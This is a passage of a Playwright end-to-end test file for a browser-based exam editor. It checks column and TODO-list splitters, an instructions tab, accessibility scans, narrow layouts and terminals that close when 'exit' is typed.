// an exam's instructions with a wide table did not fit the column) -----

// A table with a cell that cannot be broken (a regular expression), which is what made the real one wider than the column.
const wideInstructions = '<p>Read every exercise.</p><table><thead><tr><th>Regla</th><th>Token</th><th>Qué reconoce</th></tr></thead><tbody>' +
  [['ID', '<code>[A-Za-z_][A-Za-z0-9_]*(\\.[A-Za-z_][A-Za-z0-9_]*)*</code>'], ['NUM', '<code>[0-9]+(\\.[0-9]+)?([eE][+-]?[0-9]+)?</code>']]
    .map(([token, what], i) => `<tr><td>${i + 1}</td><td>${token}</td><td>${what}</td></tr>`).join('') + '</tbody></table>';
const width = async (page, selector) => (await page.locator(selector).boundingBox()).width;
const rem = page => page.evaluate(() => parseFloat(getComputedStyle(document.documentElement).fontSize));
const height = async (page, selector) => (await page.locator(selector).boundingBox()).height;

test('a splitter gives the left column more of the width, with the pointer and the keys, and the editor keeps its room', async ({ page }) => {
  await start(page, {}, { width: 1280, height: 800 });
  const splitter = page.getByRole('separator', { name: 'Resize the left column' });
  await expect(splitter).toBeVisible();
  const usual = await width(page, '.side');
  const r = await rem(page);
  expect(usual).toBeLessThanOrEqual(21 * r + 1); // the usual column: 15 to 21rem
  const valueIs = value => expect(splitter).toHaveAttribute('aria-valuenow', String(value));

  // Dragging to the right widens the column, and the editor gives up the room.
  const editorBefore = await width(page, '.main');
  const handle = await splitter.boundingBox();
  const x = handle.x + handle.width / 2;
  const y = handle.y + handle.height / 2;
  await page.mouse.move(x, y);
  await page.mouse.down();
  await page.mouse.move(x + 300, y, { steps: 8 });
  await page.mouse.up();
  await expect.poll(() => width(page, '.side')).toBeGreaterThan(usual + 250);
  expect(await width(page, '.main')).toBeLessThan(editorBefore - 250);

  // Dragging far to the right stops where the editor still has its 24rem.
  const moved = await splitter.boundingBox();
  await page.mouse.move(moved.x + moved.width / 2, y);
  await page.mouse.down();
  await page.mouse.move(1270, y, { steps: 8 });
  await page.mouse.up();
  await valueIs(70);
  expect(await width(page, '.main')).toBeGreaterThanOrEqual(24 * r - 1);

  // The keys: Home and End are the ends, the arrows a step, Enter (or a double click) the usual width.
  await splitter.focus();
  await page.keyboard.press('End');
  await valueIs(15);
  expect(await width(page, '.side')).toBeGreaterThanOrEqual(15 * r - 1); // never narrower than 15rem
  await page.keyboard.press('ArrowRight');
  await page.keyboard.press('ArrowRight');
  await valueIs(20);
  await page.keyboard.press('PageUp');
  await expect.poll(async () => Number(await splitter.getAttribute('aria-valuenow'))).toBeGreaterThanOrEqual(27);
  await page.keyboard.press('Enter');
  await expect.poll(() => width(page, '.side')).toBeLessThanOrEqual(usual + 1);
  await page.keyboard.press('Home');
  await valueIs(70);
  await splitter.dblclick();
  await expect.poll(() => width(page, '.side')).toBeLessThanOrEqual(usual + 1);
  // The editor works as before, and nothing is written to the computer.
  const editor = await openSrc(page);
  await expect(editor).toContainText('push_front');
  expect(await page.evaluate(() => window.__storage.length)).toBe(0);
});

const manyTodos = Array.from({ length: 14 }, (_, i) => ({ id: `t${i + 1}`, text_html: `Item ${i + 1} of the list` }));

test('the instructions are a tab in front at the start; the first file opens beside them, and a wide table has the room of a pane', async ({ page }) => {
  await start(page, { instructions: wideInstructions }, { width: 1366, height: 768 });
  const reading = page.getByRole('region', { name: 'Instructions', exact: true });
  await expect(reading).toContainText('Read every exercise.');
  await expect(page.getByRole('tab', { name: /Instructions/ })).toHaveAttribute('aria-selected', 'true');
  const entry = page.getByRole('button', { name: /^Instructions/ });
  await expect(entry).toContainText('In front');
  // Read-only: the exam's text, not an editor.
  await expect(page.getByRole('textbox', { name: /Editor for/ })).toHaveCount(0);
  await expect(reading).toContainText('read-only, part of the exam');
  // Its table has the room of the editor.
  expect((await reading.locator('table').boundingBox()).width).toBeGreaterThan(500);
  // The first file opened goes beside them, never over them; so does the next while they are in front of the pane last used.
  await openFile(page, 'notes.txt');
  await expect(page.getByRole('region', { name: 'Editor (left)' }).getByRole('tab')).toHaveText([/Instructions/]);
  await expect(page.getByRole('region', { name: 'Editor (right)' }).getByRole('tab')).toHaveText([/notes\.txt/]);
  await expect(reading).toBeVisible();
  await expect(entry).toContainText('In front · left');
  await reading.click();
  await openFile(page, 'Makefile');
  await expect(page.getByRole('region', { name: 'Editor (right)' }).getByRole('tab')).toHaveText([/notes\.txt/, /Makefile/]);
  await expect(reading).toBeVisible();
});

test('the instructions close like a tab and come back from the left column, and Close all leaves them open', async ({ page }) => {
  await start(page, { instructions: examText });
  const reading = page.getByRole('region', { name: 'Instructions', exact: true });
  const entry = page.getByRole('button', { name: /^Instructions/ });
  await openFile(page, 'notes.txt');
  // Moved into the pane of the file, they are behind it there (the left pane, left with nothing, goes).
  await page.getByRole('region', { name: 'Editor (left)' }).getByRole('tab', { name: /Instructions/ }).click();
  await page.getByRole('button', { name: 'Move to the other side (left)' }).click();
  await expect(page.getByRole('region', { name: 'Editor', exact: true }).getByRole('tab')).toHaveText([/notes\.txt/, /Instructions/]);
  await page.getByRole('tab', { name: /notes\.txt/ }).click();
  await expect(entry).toContainText('Open · behind a file');
  await expect(reading).toBeHidden();
  // Close all closes the files and leaves the instructions, which come to the front.
  await page.getByRole('button', { name: 'Tab actions' }).click();
  await page.getByRole('menuitem', { name: 'Close all' }).click();
  await expect(page.getByRole('tab')).toHaveText([/Instructions/]);
  await expect(reading).toBeVisible();
  // Ctrl+W closes them too; the pane offers them again, and so does the left column.
  await reading.focus();
  await page.keyboard.press('Control+w');
  await expect(page.getByRole('tab', { name: /Instructions/ })).toHaveCount(0);
  await expect(entry).toContainText('Closed');
  await expect(page.getByRole('button', { name: 'Open the instructions' })).toBeVisible();
  await entry.click();
  await expect(reading).toBeVisible();
  await expect(reading).toBeFocused();
  await expect(entry).toContainText('In front');
  await page.getByRole('button', { name: 'Close Instructions' }).click();
  await page.getByRole('button', { name: 'Open the instructions' }).click();
  await expect(reading).toBeVisible();
});

test('the TODO list is in the left column above the files, its heading in view however long the list, and a splitter sets how tall it may be', async ({ page }) => {
  await start(page, { instructions: examText, todos: manyTodos }, { width: 1280, height: 800 });
  const heading = page.getByRole('heading', { name: /TODO/ });
  await expect(heading).toContainText('0/14');
  await page.getByRole('checkbox', { name: 'Item 1 of the list' }).check();
  await expect(heading).toContainText('1/14');
  // The list scrolls under its heading, and the files are in view below it.
  await page.locator('#todo-panel ul').evaluate(ul => { ul.scrollTop = ul.scrollHeight; });
  await expect(page.getByRole('checkbox', { name: 'Item 14 of the list' })).toBeInViewport();
  await expect(heading).toBeInViewport();
  await expect(page.getByRole('treeitem', { name: 'Makefile' })).toBeInViewport();
  const splitter = page.getByRole('separator', { name: 'Resize the TODO list' });
  await expect(splitter).toHaveAttribute('aria-valuenow', '35');
  const usual = { todo: await height(page, '.todo-box'), files: await height(page, '.tree-box') };
  // Dragging down lets the list take more of the column, and the files less.
  const handle = await splitter.boundingBox();
  await page.mouse.move(handle.x + handle.width / 2, handle.y + handle.height / 2);
  await page.mouse.down();
  await page.mouse.move(handle.x + handle.width / 2, handle.y + 120, { steps: 8 });
  await page.mouse.up();
  await expect.poll(() => height(page, '.todo-box')).toBeGreaterThan(usual.todo + 90);
  expect(await height(page, '.tree-box')).toBeLessThan(usual.files - 90);
  // The keys: down is more for the list, up less; Home and End the ends; Enter or a double click the usual share.
  await splitter.focus();
  await page.keyboard.press('Home');
  await expect(splitter).toHaveAttribute('aria-valuenow', '80');
  await page.keyboard.press('End');
  await expect(splitter).toHaveAttribute('aria-valuenow', '10');
  await page.keyboard.press('ArrowDown');
  await expect(splitter).toHaveAttribute('aria-valuenow', '15');
  await page.keyboard.press('Enter');
  await expect(splitter).toHaveAttribute('aria-valuenow', '35');
  await expect.poll(async () => Math.abs((await height(page, '.todo-box')) - usual.todo)).toBeLessThan(3);
  await page.keyboard.press('PageDown');
  await expect(splitter).toHaveAttribute('aria-valuenow', '50');
  await splitter.dblclick();
  await expect(splitter).toHaveAttribute('aria-valuenow', '35');
  // A short list takes only its own room.
  await start(page, { instructions: examText }, { width: 1280, height: 800 });
  expect(await height(page, '.todo-box')).toBeLessThan(usual.todo - 50);
});

test('the instructions, the TODO list and two panes have no critical accessibility problems', async ({ page }) => {
  await start(page, { instructions: wideInstructions });
  const scan = async label => {
    const result = await new AxeBuilder({ page }).exclude('header.toolbar').analyze();
    const serious = result.violations.filter(violation => ['critical', 'serious'].includes(violation.impact));
    expect(serious.map(v => `${v.impact} ${v.id}: ${v.help} :: ${v.nodes.map(n => n.target.join(' ')).join(' | ')}`), label).toEqual([]);
  };
  await scan('the instructions in front');
  await openFile(page, 'notes.txt');
  await expect(page.getByRole('region', { name: 'Editor (right)' })).toBeVisible();
  await scan('the instructions beside a file');
  await page.getByRole('button', { name: 'Close Instructions' }).click();
  await page.getByRole('button', { name: 'Close notes.txt' }).click();
  await expect(page.getByRole('button', { name: 'Open the instructions' })).toBeVisible();
  await scan('an empty pane');
});

test('in a narrow window the column is the whole width above the editor, with nothing to resize', async ({ page }) => {
  await start(page, { instructions: wideInstructions }, { width: 820, height: 900 });
  await expect(page.getByRole('heading', { name: /TODO/ })).toBeVisible();
  await expect(page.getByRole('button', { name: /^Instructions/ })).toBeVisible();
  await expect(page.getByRole('separator', { name: 'Resize the TODO list' })).toBeHidden();
  await expect(page.getByRole('separator', { name: 'Resize the left column' })).toBeHidden();
  await expect(page.getByRole('button', { name: 'Wider instructions' })).toHaveCount(0);
});

test('typing exit in a terminal closes its tab, and the keyboard goes to the next terminal or, with none left, to the editor', async ({ page }) => {
  await start(page);
  await openSrc(page);
  const panel = page.locator('.terminal-box');
  await openTerminal(page);
  await expect(page.getByRole('textbox', { name: 'Terminal 1 input' })).toBeFocused();
  // A second terminal: the panel names both, and the one in front gets the exit.
  await page.getByRole('button', { name: 'New terminal' }).click();
  await expect(page.getByRole('tab', { name: /Terminal 2/ })).toBeVisible();
  await page.getByRole('textbox', { name: 'Terminal 2 input' }).pressSequentially('exit');
  await page.keyboard.press('Enter');
  await expect(page.getByRole('tab', { name: /Terminal 2/ })).toHaveCount(0);
  await expect(page.getByRole('status').filter({ hasText: 'ended with code' })).toHaveCount(0);
  await expect(page.getByRole('tab', { name: /Terminal 1/ })).toHaveAttribute('aria-selected', 'true');
  await expect(page.getByRole('textbox', { name: 'Terminal 1 input' })).toBeFocused();
  expect(await server(page, 'server.requests.filter(r => r.type === "pty.close").length')).toBe(1);

  // The last one: the panel goes away, the keyboard is in the editor, and the button opens a new terminal.
  await page.keyboard.type('exit');
  await page.keyboard.press('Enter');
  await expect(panel).toBeHidden();
  await expect(page.getByRole('textbox', { name: /Editor for/ })).toBeFocused();
  await expect(page.getByRole('button', { name: 'Terminal', exact: true })).toBeVisible();

  // What the exam started stays, with how it ended.
  await page.getByRole('button', { name: 'Check', exact: true }).click();
  await expect(page.getByRole('status').filter({ hasText: /Check ended with code/ })).toBeVisible();
});
